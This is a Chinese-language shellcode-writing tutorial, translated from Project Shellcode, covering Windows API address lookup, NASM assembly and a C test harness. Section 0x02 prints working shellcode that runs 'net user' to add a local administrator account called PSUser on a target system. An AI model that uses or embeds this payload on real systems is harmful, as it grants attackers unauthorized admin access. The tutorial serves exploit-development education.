# shellcode教程从新手到高手

0x00 介绍与工具安装
=====

在这个站点中的这套教程目的在于利用汇编代码来生成自己的shellcode，它将有希望地被包含在"Project Shellcode Development Framework"（shellcode 开发框架项目）中Windows shellcode和linux shellcode 的不同点是什么？

这个教程的一些内容是以在http://www.vividmachines.com/shellcode/shellcode.html中被抽出的信息为基础而讲述的.

Linux，不像windows那样，它提供了一个通过int 0x80接口来与内核直接相结合的方法.可以在http://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html中找到完整的linux系统调用表。在另一方面，windows没有一个直接的内核接口。系统必须通过加载函数地址来相结合，它需要从一个动态链接库中被执行。两种系统的关键不同点事实上在于windows中的函数地址在一个系统版本和另一个系统版本中的变化，因为int 0x80系统调用号是恒定的。Windows程序员这样做以致于他们可以不会为了任何内核需要的改变而争论。Linux相反，已经固定了所有内核级函数的计算系统，并且如果他们要改变，将会有无数愤怒的程序员（和大量的不完善的代码）

地址:http://www.vividmachines.com/shellcode/shellcode.html

所以，windows呢？我怎样找到我需要的dll的函数地址呢？这些地址不会随着每个服务包的升级而变化么？

有许多方法可以找出需要使用于shellcode中的函数地址。

这里给出了两种寻找函数地址的方法：你可以在运行时上找需要的函数或使用硬编码的地址。这个教程将多数讨论硬编码的方法。被映射进shellcode地址空间的dll是kernel32.dll。这个dll含有LoadLibrary 和 GetProcAddress函数，这两个函数被用于获取任意被映射进exploits进程空间中的函数地址。这种方法伴随着一个问题，地址偏移将会随着每个windows的新版本而改变（服务包，补丁等等）。所以，你使用这种方法生成的shellcode将仅仅对某个windows的特定版本有效。

动态查找函数地址的方法将会出现在之后的教程中

集中于对windows汇编的讨论；然而在开发shellcode方面，linux相当方便。因为这个原因，我发现用cygwin可以搭建一个不错的开发shellcode的平台。同时也可以访问windows Dlls，下载地址：http://www.projectshellcode.com/downloads/cygwin_setup.exe 在Cygwin安装期间，会让你选择你想要的安装包

以下包便于生成shellcode:

*   Devel->binutils (包含 ld, as, objdump)
*   Devel->gcc
*   Devel->make
*   Devel->nasm
*   Devel->gdb
*   Editors->hexedit
*   Editors->vim
*   Net->netcat
*   System->util-linux

已经搭建了cygwin环境，就下载下面的工具吧。一些是我自己用来使处理事情变得更容易的脚本，和另外两个额外的资源，你将想要把他们存放到你的cygwin环境中，例如把他们复制进C:\cygwin\home\Administrator\shellcode\中。Administrator是你的用户名，同时我已经创建了一个shellcode目录作为我们的工作站。

*   xxd-shellcode.sh

通过解析xxd的输出来提取未经修改的shellcode

 http://www.projectshellcode.com/downloads/xxd-shellcode.sh

*   shellcode-compiler.sh

自动化编译汇编代码，提取未经修改的shellcode，生成unicode编码版的未经修改的shellcode ，把你已经编码的shellcode注入到"Template Exploit" (ms07-004) 来测试，创建一个含有你的shellcode的c测试程序，同时编译他们准备执行！非常方便！

下载地址： http://www.projectshellcode.com/downloads/shellcode-compiler.sh或http://www.projectshellcode.com/downloads/shellcode-compiler.zip

*   findFunctionInDLL.sh

http://www.projectshellcode.com/downloads/findFunctionInDLL.sh

在你的系统上找到包含一个特定windows函数的dll

*   arwin.c

Win32 dll 地址解析程序

http://www.vividmachines.com/shellcode/arwin.c

*   shellcodetest.c

 http://www.vividmachines.com/shellcode/shellcodetest.c

从开始菜单中运行一个bash shell并cd到你的“shellcode”目录，例如 cd /home/Administrator/shellcode/.通过使用下面的命令编译arwin.c

> gcc -o arwin arwin.c

通过输入./arwin列出帮助.

暂时不需要编译shellcodetest.c。把生成的shellcode放入shellcodetest.c并编译它。同时可以通过运行shellcodetest来执行我们的shellcode.

Metasploit 框架是一个极好的生成shellcode的资源.在写这篇文章时，Metasploit团队即将发行Framework 3.3，它将运行在Windows上的一个cygwin环境中,开发版可以通过下面的链接来下载

*   Metasploit Framework 3.3-dev

http://www.projectshellcode.com/downloads/framework-3.3-dev.exe

这个版本的框架安装在c：\msf3\中，并有它自己专用的cygwin环境。你可以通过shell.bat执行一个shell。

这些极好的windows程序也将使用于教程4中，需要下载如下工具：

*   OllyDbg 1.10 (极好的Windows调试器)

下载地址： http://www.projectshellcode.com/downloads/odbg110.zip

*   lcc-win32 (免费的windows c 编译器)

下载地址：http://www.projectshellcode.com/downloads/lccwin32.exe)

生成你第一个简单的shellcode程序吧

0x01 一段简明的shellcode
=====

这个教程教你shellcoding的基础,包括

1.  在windows DLLs中定位函数地址;
    
2.  简单的汇编;
    
3.  编译ASM代码的方法;
    
4.  执行你的shellcode（如果它生效了）来明白其实现原理的方法.
    

下面我们将会生成最简明的shellcode代码（只是简单的睡眠5秒后退出）.

这个教程的一些内容是基于http://www.vividmachines.com/shellcode/shellcode.html中被摘取出的信息而讲述的.

在windows DLLs中找到函数地址的方法

命名为”Sleep“的函数是睡眠的windows 函数,所以需要知道利用这个函数可以做些什么?在汇编中,我们使用call” 0xXXXXXXX”指令,XXXXXXXX是在内存中的函数地址.因此需要找到这个函数被加载的地址.

这可以使用在第一个教程中已经下载并编译好的”arwin”程序来完成.如果从创建好的shellcode目录中运行./arwin.exe,你将看到如下使用方法的信息:

> $ ./arwin.exe
> 
> arwin - win32 address resolution program - by steve hanna - v.01
> 
> ./arwin

因此使用Arwin我们需要知道函数存在于哪个DLL中这通常将会是Kernel32.dll或User32.dll或ws2_32.dll;.

然而,这取决于你的shellcode试图实现的内容.下面的脚本"findFunctionInDLL.sh"我已经写好了,它是一个arwin的wrapper,在你的本地系统上的查找DLLs以找出我们的函数在哪个DLLs中.

```
if [ $# -ne 1 ]
then
printf "\n\tUsage: $0 functionname\n\n"
exit
fi
functionname=$1
searchDir="/cygdrive/c/WINDOWS/system32"
arwin_exe="`pwd`/arwin.exe"
cd $searchDir
ls -1d *.dll | grep -v gui | while read dll
do
printf "\r ";
printf "\r$dll";
count=0
count=`$arwin_exe $dll $functionname | grep -c "is located at"`
if [ $count -ne 0 ]
then
printf "\n";
$arwin_exe $dll $functionname | grep "is located at"
printf "\n";
fi
done
printf "\r ";

```

把有如上代码的findFunctionInDll.sh复制到你的系统上,运行”chmod 755 findFuntionInDll.sh”以使它可执行.

你应该确保你的Windows 系统目录被定位在/cygdrive/c/WINDOWS/system32上（在你的Cygwin 程序的环境内）

使用这个脚本找到需要传递到arwin程序中的DLL.脚本在你系统上遍历DLLs,同时它应该向你报告（输出）任意匹配到的函数和地址:

> ./findFunctionInDLL.sh Sleep
> 
> kernel32.dll
> 
> Sleep is located at 0x7c802442 in kernel32.dll

你得到的地址或许和我的不同,这取决于操作系统和服务包.我正使用的是WindowsXP SP2.这意味着你的shellcode将只会在相同的操作系统和使用的服务包上正常运行因为我们已经硬编码了函数的内存地址.更高级的是可以被用于动态定位Kernel32.dll和函数地址的技术;然而,那将会在之后的教程中细说. 这会花上一段时间,因此如果你已经知道你的函数存在于哪个DLL，那么你可以直接运行arwin:

> ./arwin.exe Kernel32.dll Sleep   arwin - win32 address resolution program - by steve hanna - v.01
> 
> Sleep is located at 0x7c802442 in Kernel32.dll

汇编代码

接下来的sleep.asm代码是从http://www.vividmachines.com/shellcode/shellcode.html中摘取出来的（带有少许的修改）.

在你的本地系统上（在你的cygwin shellcode目录内）使用如下代码创建sleep.asm.因为它们解释了执行每一行指令做了什么,同时为之后的shellcode设计给予了有用的提示.记得用如上通过arwin已经枚举到的地址来替换”Sleep”函数的地址.

```
;sleep.asm
[SECTION .text]
; set the code to be 32-bit
; Tip: If you don't have this line in more complex shellcode,
;    the resulting instructions may end up being different to
;    what you were expecting.
BITS 32
global _start
_start:
; clear the eax register
; Tip: xor is great for zeroing out registers to clear previous values.
xor eax,eax
; move address of Sleep to ebx that we gained from "./arwin.exe Kernel32.dll Sleep"
mov ebx, 0x7c802442
; pause for 5000ms by putting 5000 into ax (8 bit eax register)
; Tip: ax is the lower half of eax. Using ax when possible reduces
;    the instruction size, and therefore the shellcode size.
mov ax, 5000
; push eax onto the stack as the first parameter to the Sleep function.
; Tip: When functions are called, the parameters are pulled from the stack.
push eax
; call the address of Sleep(ms) located in ebx
; Tip: Sleep has one parameter and will pull this from the stack.
call ebx

```

编译汇编代码 现在已经有了用汇编语言写好的shellcode了，我们需要编译它.这可以使用nasm汇编编译器来完成,在有sleep.asm（是你的汇编源代码文件）的目录下使用如下命令,sleep.bin是已经被编译好的二进制输出文件

> nasm -f bin -o sleep.bin sleep.asm

获取shellcode

现在我们有了一个编译好的二进制文件，可以使用xxd工具来生成shellcode文件.这可以使用以下的xxd命令来完成,同时将会生成以下输出:

> xxd -i sleep.bin
> 
> unsigned char sleep_bin[] = {
> 
> 0x31, 0xc0, 0xbb, 0x42, 0x24, 0x80, 0x7c, 0x66, 0xb8, 0x88, 0x13, 0x50,
> 
> 0xff, 0xd3
> 
> };
> 
> unsigned int sleep_bin_len = 14;

这产生一个可以被使用于一个c程序内的字符数组.

输出的每个十六进制的号码（0xXX）在shellcode内代表一个字节.

那么我们会想怎样处理这个输出来产生shellcode呢?我们将使用如下脚本，这个是我放在一起用来去除可以直接地放入我们的“shellcodetest.c”程序中未经修改的shellcode的脚本,复制如下代码到你自己机器中的shellcode目录里,然后使用”chmod 755 xxd-shellcode.sh”改变权限.

```
if [ $# -ne 1 ]
then
    printf "\n\tUsage: $0 filename.bin\n\n"
    exit
fi
filename=`echo $1 | sed s/"\.bin$"//`
rm -f $filename.shellcode
for i in `xxd -i $filename.bin | grep , | sed s/" "/" "/ | sed s/","/""/g | sed s/"0x"/"\\\\x"/g`
do
    echo -n "\\$i" >> $filename.shellcode
    echo -n "\\$i"
done
echo

```

这个程序可以使输入文件”sleep.bin”起作用,因此运行如下命令,它应该产生如下输出,这个输出将自动化地被存储到”sleep.shellcode”中.由于在你的系统上Sleep函数的地址不同,所以如果你正使用一个不同的系统或服务包，这个输出可能会略有改变

> ./xxd-shellcode.sh sleep.bin \x31\xc0\xbb\x42\x24\x80\x7c\x66\xb8\x88\x13\x50\xff\xd3

测试shellcode

使用”shellcodetest.c”程序来测试我们的shellcode.这个步骤是为了把我们的shellcode插入到一个c程序中,我们可以编译并执行它.这个程序已经被设计好来执行我们的shellcode了.

这样做之前,需要插入你的shellcode（从上个步骤生成的）到这个程序中.你把它放到”code[]”数组的引号之间.最后应该看起来像如下所示的那样:

```
/*shellcodetest.c*/
char code[] = "\x31\xc0\xbb\x42\x24\x80\x7c\x66\xb8\x88\x13\x50\xff\xd3";
int main(int argc, char **argv)
{
int (*func)();
func = (int (*)()) code;
(int)(*func)();
}

```

我们现在需要编译已经修改好的shellcodetest.c程序以让它可以执行我们的shellcode.用如下命令完成:

> gcc -o shellcodetest shellcodetest.c

生成可执行程序”shellcodetest.exe”.

现在应该可以执行这个程序了,然后它会执行你的shellcode.用这个程序来明白这被设计好的shellcode仅仅简单地睡眠5秒,然后将会退出-同时可能发生core dump,但是在这个阶段不关心这个问题.

> ./shellcodetest.exe   (sleeps for 5 seconds)   (then exits - and may core dump)

恭喜！你已经写出,编译,去除,格式化,同时已经测试了你的第一段shellcode代码!

现在让我们设计一些真正可以看的到的东西吧！

0x02 命令执行shellcode
=====

这个教程不过是第一个教程的扩展教程;

然而,除了设计简单地睡眠5秒的shellcode外,在受害者系统上它调用WinExec函数来创建一个新的有管理权限的用户.

这个教程也教你定义和定位字符串常量的方法.在这种情况下你想执行的字符串命令.也将干净利落地退出进程而不会产生一个core dump.

这个教程的一些内容是以在http://www.vividmachines.com/shellcode/shellcode.html中被摘取出的信息为基础而讲述的.

我们的目的

我们的shellcode将定位我们的命令行字符串并通过调用WinExec函数在受害者系统上创建一个本地管理用户.要提醒注意的是这个教程将会在你的系统上创建一个管理账户,所以记得删掉它否则你可能发现你已经因为这个账户的创建而被他人黑了.

我们需要什么函数,它们在哪?

从编程经历中（或至少是通过谷歌）,我们知道在一个windows系统上执行一个命令我们需要调用WinExec函数,同时为了干净利索地退出一个进程我们需要调用ExitProcess函数.这两个函数都可以在Kernel32.dll中被找到.

为了定位函数的地址,我们将使用arwin,正如我们在上一个教程中做的那样.如下所示：

> ./arwin.exe Kernel32.dll WinExec arwin - win32 address resolution program - by steve hanna - v.01     WinExec is located at 0x7c8615b5 in Kernel32.dll

WinExec函数位于Kernel32.dll中的0x7c8615b5地址上

> ./arwin.exe Kernel32.dll ExitProcess     arwin - win32 address resolution program - by steve hanna - v.01

ExitProcess位于Kernel32.dll中的0x7c81ca82地址上你得到的地址或许和我的不同.这取决于操作系统和服务包.我正使用WindowsXP SP2.这意味着你的shellcode将只会在相同的操作系统和你使用的服务包上正常工作因为我们已经硬编码了函数的内存地址.这甚至可能是因你已经安装了补丁文件而略有不同的.这是更高级的可以被用来动态定位Kernel32.dll和函数地址的技术;然而,那将会在之后的教程中细说.

定义并定位字符串常量

下面即是我们想在我们的shellcode中定义的字符串常量,我们将执行的命令来创建一个用户名是”PSUser”密码是”PSPasswd”的账户

>  'cmd.exe /c net user PSUser PSPasswd /ADD && net localgroup Administrators /ADD PSUser'

下面小段代码示范了在我们的代码末尾定义一个字符串常量,同时在栈顶上定位字符串的方法;

```
+--------------- [snip] ---------------+
  jmp short GetCommand;Jump to where our string is located ("GetCommand" label below)
  CommandReturn:;Create a label we can call to return here.
  pop ebx;the "call" operation below has pushed its return address onto the stack, which we have designed to point to our string - so pop the address of the string off the stack and into ebx.
;At this point, ebx points to our string.
+--------------- [snip] ---------------+
GetCommand: ;Create the "GetCommand" label where our string is located
call CommandReturn ;"call" is like jump, but also pushes the return address (next instruction after call) onto the stack. Since our string is defined immediately after this instruction, the return address points to the address of our string.”call”
db "cmd.exe /c net user PSUser PSPasswd /ADD && net localgroup Administrators /ADD PSUser";Write the raw bytes into the shellcode that represent our string.        
db 0x00 ;Terminate our string with a null character.
+--------------- [snip] ---------------+

```

汇编代码

下面的adduser.asm代码是从http://www.vividmachines.com/shellcode/shellcode.html中摘取出来的,带有略微的修改和注释

在你的本地系统上Cygwin的shellcode目录中使用如下代码创建adduser.asm

在shellcode开发之后,记得用你已经使用上面的arwin枚举出来的地址替换掉”WinExec”和”ExitProcess”的函数地址

```
+----------------- Start adduser.asm -----------------+
;adduser.asm
[Section .text]
BITS 32
global _start
_start:
jmp short GetCommand ;jump to the location of the command string
CommandReturn: ;Define a label to call so that string address is pushed onto stack
pop ebx ;ebx now points to the string   ebx
    xor eax,eax ;empties out eax 
    push eax ;push null onto stack as empty parameter value 
    push ebx ;push the command string onto the stack
    mov ebx,0x7c8615b5 ;place address of WinExec into ebx
    call ebx ;call WinExec(path,showcode) 
xor eax,eax ;zero the register again to clear WinExec return value (return values are often returned into eax)
    push eax ;push null onto stack as empty parameter value
    mov ebx, 0x7c81ca82 ;place address of ExitProcess into ebx 
    call ebx ;call ExitProcess(0);
GetCommand: ;Define label for location of command string
    call CommandReturn ;call the return label so the return address (location of string) is pushed onto stack
    db "cmd.exe /c net user PSUser PSPasswd /ADD && net localgroup Administrators /ADD PSUser";Write the raw bytes into the shellcode that represent our string.
    db 0x00 ;Terminate our string with a null character.
+----------------- End adduser.asm -----------------+

```

编译汇编代码

因此我们现在已经有我们用汇编写好的shellcode了，我们需要编译它.这可以使用nasm汇编编译器来完成,在有adduser.asm（是你的汇编源代码文件）的目录下使用如下命令,adduser.bin是已经编译好的二进制输出文件

> nasm -f bin -o adduser.bin adduser.asm

获取shellcode

现在我们有了一个编译好的二进制文件,可以使用xxd工具来为我们生成shellcode文件.这可以使用以下的xxd命令来完成,同时将会生成以下输出:

> xxd -i adduser.bin     unsigned char adduser_bin[] = {      0xeb, 0x16, 0x5b, 0x31, 0xc0, 0x50, 0x53, 0xbb, 0xb5, 0x15, 0x86, 0x7c,      0xff, 0xd3, 0x31, 0xc0, 0x50, 0xbb, 0x82, 0xca, 0x81, 0x7c, 0xff, 0xd3,      0xe8, 0xe5, 0xff, 0xff, 0xff, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65,      0x20, 0x2f, 0x63, 0x20, 0x6e, 0x65, 0x74, 0x20, 0x75, 0x73, 0x65, 0x72,      0x20, 0x50, 0x53, 0x55, 0x73, 0x65, 0x72, 0x20, 0x50, 0x53, 0x50, 0x61,      0x73, 0x73, 0x77, 0x64, 0x20, 0x2f, 0x41, 0x44, 0x44, 0x20, 0x26, 0x26,      0x20, 0x6e, 0x65, 0x74, 0x20, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x67, 0x72,      0x6f, 0x75, 0x70, 0x20, 0x41, 0x64, 0x6d, 0x69, 0x6e, 0x69, 0x73, 0x74,      0x72, 0x61, 0x74, 0x6f, 0x72, 0x73, 0x20, 0x2f, 0x41, 0x44, 0x44, 0x20,      0x50, 0x53, 0x55, 0x73, 0x65, 0x72, 0x00     };     unsigned int adduser_bin_len = 115;

这产生一个可以被使用于一个c程序内的字符数组.

输出的每个十六进制的号码（0xXX）在shellcode内代表一个字节.

我们将使用”xxd-shellcode.sh”脚本来去除可以直接地放入我们的“shellcodetest.c”程序中的半成品shellcode,正如我们在上一个教程中做的那样，在下面将会展示:

> ./xxd-shellcode.sh adduser.bin \xeb\x16\x5b\x31\xc0\x50\x53\xbb\xb5\x15\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x82\xca\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x50\x53\x55\x73\x65\x72\x20\x50\x53\x50\x61\x73\x73\x77\x64\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x50\x53\x55\x73\x65\x72\x00 Testing the shellcode

测试shellcode

使用”shellcodetest.c”程序来测试我们的shellcode.这个步骤的目的是为了把我们的shellcode插入到一个c程序中,然后可以编译并执行这个c程序.为了执行我们的shellcode,这个程序已经设计好了.

这样做之前,需要把你的shellcode插入（从上个步骤生成的）到这个程序中.你把它放到”code[]”数组的引号之间.最后应该看起来像如下代码中所示的那样:

```
+----------------- Start updated shellcodetest.c -----------------+
/*shellcodetest.c*/
char code[] = "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xb5\x15\x86\x7c\xff\xd3\x31\xc0\x50\xbb\x82\xca\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x50\x53\x55\x73\x65\x72\x20\x50\x53\x50\x61\x73\x73\x77\x64\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x50\x53\x55\x73\x65\x72\x00";
int main(int argc, char **argv)
{
int (*func)();
func = (int (*)()) code;
(int)(*func)();
}
+----------------- End updated shellcodetest.c -----------------+

```

我们现在需要编译已经修改好的shellcodetest.c程序以使它可以执行我们的shellcode.可以用如下命令完成:

> gcc -o shellcodetest shellcodetest.c

创建可执行程序”shellcodetest.exe”.

在运行这个程序之前,会想在你的本地系统上通过运行以下命令来列出用户的账户

> net user     (列出在你系统上的本地账户)

你现在应该可以通过这个测试程序来执行你的shellcode了.这个shellcode被设计来在你的系统上添加一个具有管理员权限的用户（称作”PSUser”）,然后它会干净利索地退出

> ./shellcodetest.exe   The command completed successfully. 命令成功完成   (添加用户账户) 命令成功完成   (添加用户账户到管理组)   (干净利索地退出)

现在可以通过再次运行”net user”命令确认是否已经创建了账户,正如如下所示:

> net user     (列出本地系统的账户现在包含PSUser这个账户了)

整理

你应该查明你是否已经从你的系统中删除了这个账户,以确保该账户不会被人用来黑进你的系统.可以使用以下命令完成:

> net user PSUser /delete 命令成功完成  (deletes the "PSUser" account)

恭喜！

你已经设计出了你的第一段shellcode,它定义并找到了一个不变的字符串,且在一个Windows系统上执行一个命令来创建一个具有管理员权限的账户. 现在,让我们开始做个略略狡猾的人吧.

0x03 消息框shellcode
=====

这篇教程教你设计shellcode时的一些有用的技巧,例如教你加载库，动态定位windows函数,定义并找到字符串常量的地址,以及调用Windows函数的方法,这可以让你开始着手设计你自己的shellcode

这个教程的一些内容是基于http://www.vividmachines.com/shellcode/shellcode.html中被摘取出的信息而讲述的.

我们的目标

我们的shellcode目标是显示出一个包含自定义消息的对话框

我们需要调用什么函数?

从编程经验中（或至少是通过谷歌）,我们知道在Windows上生成一个消息框需要调用MessageBoxA函数,通过谷歌也可以判断是否能在user32.dll中找到MessageBoxA函数.

如果使用前面教程提到的用”findFunctionInDLL.sh”来判断这个函数是否存在于user32.dll中,并且也将输出这个函数地址.那么用如下的方式来完成.

> ./findFunctionInDLL.sh MessageBoxA user32.dll MessageBoxA is located at 0x7e45058a in user32.dll

因此我们将知道MessageBoxA 函数的地址并知道它位于user32.dll中,不幸的是,如果我们把这个地址的硬编码传入shellcode中,它将只会在你当前的操作系统中生效.即是只能在我的windows xp sp2中正常工作除此之外将使用允许我们动态地找到MessageBoxA函数地址的技术,它没有把内存地址硬编码. User32.dll已经被加载了?

在Windows中我们只知道Kernel32.dll 已经被加载了,但是我们没有必要知道user32.dll是否已经被加载.通常我们不得不认为那是没用的,除非你正在为一个特定的exploit设计shellcode.

为了在windows上加载一个库,我们可以调用”LoadLibraryA”函数,它位于Kernel32.dll中.所以我们需要找到LoadLibraryA函数的地址.如上所示,这可以通过使用findFunctionInDLL.sh来完成, 然而,一个更快的方法是直接使用arwin，因为已经知道函数和库了

> ./arwin Kernel32.dll LoadLibraryA7  arwin - win32 address resolution program - by steve hanna - v.01  LoadLibraryA is located at 0x7c801d77 in Kernel32.dll

需要记得我们仅仅试图动态找到MessageBoxA函数的地址.但是将不会试图完全地去掉所有硬编码的内存地址.这在之后的教程中将会有所涉及,它将允许你设计运行在windows平台上的shellcode

怎样找到MessageBoxA函数的地址呢?

所以在这个阶段,我们知道加载user32.dll库的方法,知道想调用的MessageBoxA函数包含在其中.但是仍然不知道怎么找到MessageBoxA函数的地址 我们可以使用 "GetProcAddress"函数,它位于Kernel32.dll中.可以传递函数名到GetProcAddress,同时它将返回函数的地址.所以首先,我们需要使用arwin定位GetProcAddress函数的地址

> ./arwin Kernel32.dll GetProcAddress
> 
>  arwin - win32 address resolution program - by steve hanna - v.01
> 
>  GetProcAddress is located at 0x7c80adc0 in Kernel32.dll

如何防止主进程崩溃?

在上一个教程中,进程崩溃造成了一次core dump.为了干净利索地退出,我们需要调用ExitProcess函数.为简单起见,我们将仅仅在Kernel32.dll内使用arwin来枚举这个函数的内存地址,这可以通过如下所示的那样完成:

> ./arwin Kernel32.dll ExitProcess  arwin - win32 address resolution program - by steve hanna - v.01  ExitProcess is located at 0x7c81ca82 in Kernel32.dll

这样我们现在已经拥有所有设计shellcode的信息了.因此你可以简单地理解下面的汇编代码,我仅仅想指出多一个被使用过的技术.

Defining and locating string constants

定义并定位字符串常量

From the above information, there are three strings that we want to define in our shellcode. These are:

从如上的信息可知,有三个字符串是我们想要定义在shellcode里面的.这些是:

    'user32.dll'     'MessageBoxA'     'Hey'

这里将使用”user32.dll”字符串作为参数传递到LoadLibraryA函数中.使用”MessageBoxA”字符串作为参数传递到GetProcAddress中.使用”Hey”作为参数传递到MessageBoxA函数中.

The following snippet of code demonstrates how we define a string at the end of our code, and locate the string at the top;

下面的小段代码示范展示了我们在代码的末尾定义字符串的方法,并在顶部定位字符串

```
+--------------- [snip] ---------------+
;Retrieve the address of the library name string set below.
 jmp short GetLibrary ;Jump to where our library string is located ("GetLibrary" label below)
GetLibraryReturn:;Create a label we can call to return here.
pop ecx ;the "call" operation has pushed the return address onto the stack, which we have designed to point to our string - so pop the address of the library name string off the stack and into ecx.
;At this point, ecx points to our string.
+--------------- [snip] ---------------+
GetLibrary: ;Create the "GetLibrary" label where our library name string is located
    call GetLibraryReturn ;"call" is like jump, but also pushes the next instruction address onto the stack. Since our string is defined immediately after this instruction, this is the address of our string.
    db 'user32.dll' ;Write the raw bytes into the shellcode that represent our string.
    db 0x00 ;Terminate our string with a null character.
+--------------- [snip] ---------------+

```

The Shellcode

接下来的msgbox.asm代码是从http://www.vividmachines.com/shellcode/shellcode.html中摘取出来的,带有略微的修改和注释

在你的本地系统上Cygwin的shellcode目录中使用如下代码创建msgbox.asm.确保你已经从头到尾地阅读了代码的注释因为它们解释了每一行代码执行的内容,同时为之后shellcode开发给予了有用的提示.

记得用你已经使用arwin程序枚举出来的地址替换掉每个函数的地址

```
+--------------- Start msgbox.asm --------------+
;msgbox.asm
[SECTION .text]
BITS 32
global _start
_start:
;zero out the registers
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx
;Retrieve the address of the library name string set below.
    jmp short GetLibrary
GetLibraryReturn:
    pop ecx ;pop address of the Library string
;Pass library string as parameter to LoadLibraryA, and call LoadLibraryA
    mov ebx, 0x7c801d77 ;LoadLibraryA(libraryname)
    push ecx ;push parameter to LoadLibraryA
    call ebx ;call LoadLibraryA - eax holds return value
;Retrieve the address of the function name string set below.
    jmp short FunctionName
FunctionReturn:
    pop ecx ;pop address of the function string
;Pass function string as parameter to LoadLibraryA, and call LoadLibraryA
    push ecx ;push string as the second parameter
    push eax ;pass first parameter
    mov ebx, 0x7c80adc0 ;GetProcAddress(hmodule,functionname)
    call ebx ;eax now holds address of MessageBoxA
    jmp short Message
MessageReturn:
    pop ecx ;get the message string
    xor edx,edx ;clear edx value
;Push the parameters onto the stack:
    push edx ;MB_OK
    push ecx ;title
    push ecx ;message
    push edx ;NULL window handle
    call eax ;MessageBoxA(windowhandle,msg,title,type)
ender:
    xor edx,edx ;empty edx out
    push eax ;move address of MessageBoxA onto stack
    mov eax, 0x7c81ca82 ;ExitProcess(exitcode);
    call eax ;exit cleanly so we don't crash parent
GetLibrary: ;Define location and string constant "user32.dll"
    call GetLibraryReturn ;push address of next byte onto stack, and return to GetLibraryReturn
    db 'user32.dll';string constant
    db 0x00;terminate string with null
FunctionName:;Define location and string constant "MessageBoxA"
    call FunctionReturn;push address of next byte onto stack, and return to FunctionReturn
    db 'MessageBoxA';string constant
    db 0x00;terminate string with null
Message:;Define location and string constant "Hey"
    call MessageReturn;push address of next byte onto stack, and return to MessageReturn
    db 'Hey';string constant
    db 0x00;terminate string with null
+--------------- End msgbox.asm --------------+

```

编译汇编代码

因此现在已经有我们用汇编语言写好的shellcode了，我们需要编译它.这可以使用nasm汇编编译器来完成,在有msgbox.asm（是你的汇编源代码文件）的目录下使用如下命令,msgbox.bin是已经编译好的二进制输出文件

> nasm -f bin -o msgbox.bin msgbox.asm

获取shellcode

现在我们有了一个编译好的二进制文件,可以使用xxd工具来为我们生成shellcode文件.这可以使用以下的xxd命令来完成,同时将会生成以下输出:

   xxd -i msgbox.bin    unsigned char msgbox_bin[] = {      0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0x31, 0xd2, 0xeb, 0x2a, 0x59, 0xbb,      0x77, 0x1d, 0x80, 0x7c, 0x51, 0xff, 0xd3, 0xeb, 0x2f, 0x59, 0x51, 0x50,      0xbb, 0xc0, 0xad, 0x80, 0x7c, 0xff, 0xd3, 0xeb, 0x34, 0x59, 0x31, 0xd2,      0x52, 0x51, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xd2, 0x50, 0xb8, 0x82, 0xca,      0x81, 0x7c, 0xff, 0xd0, 0xe8, 0xd1, 0xff, 0xff, 0xff, 0x75, 0x73, 0x65,      0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0xe8, 0xcc, 0xff, 0xff,      0xff, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x41,      0x00, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x48, 0x65, 0x79, 0x00    };    unsigned int msgbox_bin_len = 94;

这产生一个可以被使用于一个c程序内的字符数组.

输出的每个十六进制的号码（0xXX）在shellcode内代表一个字节.

那么我们会想怎样处理这个输出来产生shellcode呢?我们将使用如下脚本，这个是我放在一起用来去除可以直接地放入我们的“shellcodetest.c”程序中未经修改的shellcode的脚本,复制如下代码到你自己机器中的shellcode目录里,然后使用”chmod 755 xxd-shellcode.sh”改变权限.

我们将使用”xxd-shellcode.sh”脚本来去除可以直接地放入我们的“shellcodetest.c”程序中的未经修改的shellcode,正如我们在上一个教程中做的那样，在下面将会展示:

> ./xxd-shellcode.sh msgbox.bin
> 
>    \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x2a\x59\xbb\x77\x1d\x80\x7c\x51\xff\xd3\xeb\x2f\x59\x51\x50\xbb\xc0\xad\x80\x7c\xff\xd3\xeb\x34\x59\x31\xd2\x52\x51\x51\x52\xff\xd0\x31\xd2\x50\xb8\x82\xca\x81\x7c\xff\xd0\xe8\xd1\xff\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\xe8\xcc\xff\xff\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x00\xe8\xc7\xff\xff\xff\x48\x65\x79\x00

测试shellcode

使用”shellcodetest.c”程序来测试我们的shellcode.这个步骤的目的是为了把我们的shellcode插入到一个c程序中,然后可以编译并执行这个c程序.这个程序已经被设计好来执行我们的shellcode.

这样做之前,需要把你的shellcode（从上个步骤生成的）插入到这个程序中.并把它放到”code[]”数组的引号之间.最后看起来应该像如下代码中所示的那样:

```
+----------------- Start updated shellcodetest.c -----------------+
/*shellcodetest.c*/
